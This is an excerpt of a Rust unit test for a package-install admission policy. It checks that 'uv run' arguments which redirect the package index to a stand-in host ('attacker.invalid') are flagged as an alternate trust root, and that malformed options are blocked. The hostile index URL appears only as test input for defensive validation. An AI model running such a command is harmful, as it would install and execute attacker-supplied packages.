...
#[test]
fn uv_run_trust_parser_preserves_reviewed_option_phase_edges() {
    let (policy, mut intent) = approved_uv_install();
    ...
    for argv in [
        ...
        vec![
            "uv",
            "run",
            "-ihttps://attacker.invalid/simple",
            "python",
        ],
        vec![
            "uv",
        ...
        assert!(
            decision
                .reason_codes
                .contains(&ReasonCode::AlternateTrustRoot),
            "reviewed uv-run option grammar must retain uv-owned trust authority until the child boundary: {:?}",
            decision.reason_codes
        );
    }
    ...
    let malformed_option_decision = admission_decision(&policy, &intent);
    assert_eq!(malformed_option_decision.decision, DecisionKind::Block);
    assert!(
        malformed_option_decision
            .reason_codes
            .contains(&ReasonCode::ForbiddenCommand)
    );
    assert!(
        !malformed_option_decision
            .reason_codes
            .contains(&ReasonCode::AlternateTrustRoot),
        "after an incomplete value-taking uv-run option, later tokens must not be promoted to trustworthy uv-owned option evidence: {:?}",
        malformed_option_decision.reason_codes
    );
}
